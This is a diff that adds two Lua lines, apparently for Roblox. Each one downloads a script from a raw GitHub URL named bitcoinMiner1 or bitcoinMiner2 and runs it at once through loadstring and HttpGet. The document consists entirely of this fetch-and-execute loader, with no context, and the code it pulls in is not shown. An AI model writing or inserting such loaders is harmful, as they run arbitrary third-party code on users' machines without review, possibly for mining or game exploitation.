@@ -1,0 +1,3 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/rctnz/script/main/bitcoinMiner1.txt"), true))()
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/rctnz/script/main/bitcoinMiner2.txt"), true))()
+
